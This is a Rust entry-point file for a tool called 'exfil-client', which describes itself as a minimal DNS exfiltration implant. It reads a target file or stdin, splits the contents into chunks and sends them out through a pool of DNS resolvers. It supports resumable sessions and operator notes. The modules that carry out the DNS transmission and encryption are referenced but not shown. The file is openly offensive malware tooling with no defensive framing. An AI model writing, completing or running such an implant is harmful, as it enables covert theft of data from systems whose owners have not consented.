mod base36;
mod chunker;
mod config;
mod crypto;
mod dns;
mod metadata;
mod resolver;

use anyhow::{Context, Result};
use clap::Parser;
use std::fs::File;
use std::io::{stdin, Read};
use std::path::PathBuf;
use std::time::Instant;

use chunker::ChunkScheduler;
use config::Config;
use dns::DnsTransmitter;
use metadata::{ExfilJobContext, ExfilSession};
use resolver::ResolverPool;

#[derive(Parser, Debug)]
#[command(name = "exfil-client", about = "Minimal DNS exfiltration implant")]
struct Args {
    /// File to exfiltrate (omit to read from stdin)
    #[arg(short, long)]
    file: Option<PathBuf>,

    /// Optional operator label recorded with the transfer
    #[arg(short = 'n', long, default_value = "")]
    note: String,

    /// Resume an existing session id (hex)
    #[arg(long)]
    session: Option<String>,
}

fn main() -> Result<()> {
    let args = Args::parse();
    let cfg = Config::load();
    let mut buffer = Vec::new();

    if let Some(path) = args.file.as_deref() {
        let mut file = File::open(path).with_context(|| format!("failed to open {:?}", path))?;
        file.read_to_end(&mut buffer)
            .with_context(|| format!("failed to read {:?}", path))?;
    } else {
        stdin()
            .read_to_end(&mut buffer)
            .context("failed to read stdin")?;
    }

    if buffer.is_empty() {
        anyhow::bail!("no data to exfiltrate");
    }

    let resolver_pool = ResolverPool::new(&cfg)?;
    let mut transmitter = DnsTransmitter::new(cfg.clone(), resolver_pool);
    let scheduler = ChunkScheduler::new(cfg.clone());

    let job =
        ExfilJobContext::from_source(&buffer, args.file.as_deref(), &args.note, cfg.chunk_bytes);
    let mut session = if let Some(session_hex) = args.session {
        ExfilSession::resume(&job, session_hex)?
    } else {
        ExfilSession::new(job)
    };

    println!(
        "[*] Exfiltrating {} bytes with {} chunks (session {})",
        session.job.total_size,
        session.job.total_chunks,
        session.session_id_hex()
    );

    let start = Instant::now();
    scheduler.run(&mut session, &mut transmitter)?;
    let elapsed = start.elapsed();
    println!(
        "[+] Transfer completed in {:.1?} ({} chunks)",
        elapsed, session.job.total_chunks
    );

    Ok(())
}
